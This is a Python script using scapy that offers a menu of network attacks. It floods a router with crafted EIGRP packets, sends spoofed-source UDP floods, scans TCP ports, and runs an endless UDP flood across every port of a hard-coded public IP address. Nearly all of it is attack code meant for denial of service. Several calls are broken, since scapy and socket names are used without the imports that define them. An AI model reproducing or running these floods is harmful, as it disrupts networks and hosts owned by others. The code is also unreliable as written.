def test():
	
	import time
	import scapy.all

	hn = input('test your own network y/n/other:')
	



	if hn == 'y':
		a = int(input('Amount to send:'))
		times = int(input('times:'))
		load_contrib('eigrp')
		#pre hit
		for i in range (0, 500):

			sendp(Ether()/IP(src="192.168.2.1", dst="192.168.0.1")/EIGRP(asn=100, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255,k4=255,k5=255),EIGRPSwVer()]))
		print("pre endet")
		time.sleep(1)
		#attack
		for i in range (0, a):

			sendp(Ether()/IP(src="192.168.2.1", dst="192.168.0.1")/EIGRP(asn=100, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255,k4=255,k5=255),EIGRPSwVer()])) 

		#time.sleep(2)

	elif hn == 'n':
		a = int(input('Amount to send:'))
		times = int(input('times:'))
		load_contrib('eigrp')
		to = input('to:')
		froms = "192.168.2.1"
		fport = int(input('src port:'))
		rport = int(input('dst port:'))
		for i in range (0, times):
			send(IP(src=to, dst=froms)/UDP(sport=fport, dport=rport), count=a)
			#time.sleep(1)

	elif hn == 'burst':
		a = int(input('Amount to send:'))
		times = int(input('times:'))
		for i in range (0, times):

			print("paused")
			time.sleep(1)
			for i in range (0, a):
				load_contrib('eigrp')

				sendp(Ether()/IP(src="192.168.2.1", dst="192.168.0.1")/EIGRP(asn=100, tlvlist=[EIGRPParam(k1=255, k2=255, k3=255,k4=255,k5=255),EIGRPSwVer()]))
	elif hn == 'other':
		print('|1| scan')
		print('|2| dos')
		print('|3| (comming soon)')
		

		aaa = input(':')
		if aaa == '1':
			import socket
			import time

			if __name__ =="__main__":
				target = input('Host to scan:')
				if target == '':
					t_IP = "127.0.0.1"
		
				else:
					t_IP = gethostbyname(target)
	
				print('Start scaning of host:' , t_IP)

				for i in range(50, 500):
					s = socket(AF_INET, SOCK_STREAM)

					conn = s.connect_ex((t_IP, i))
					if (conn == 0):
						print('port %d: open' % (i,))
					s.close()
                			 
		elif aaa == '2':                	
			import socket

			p = int(input('port:'))
			ip = '81.169.145.165' 
			#input('ip:')
			a = 0
			sent = 0
			sr = input('Message:')
			sock = socket(AF_INET, SOCK_DGRAM)
			bytes = sr.encode('utf-8')
			while True:
				sock.sendto(bytes, (ip,p))
				sent2 = sent + 1
				sent = sent2
				a = p + 1
				p = a
				print('Send', sent,  'Package/s with Message:', sr)
				if p == 65535:
					p = 1




	else:
		pass

while True:
	try:
		test()
		
	except KeyboardInterrupt:
		print('\n 8==D')
		break
		
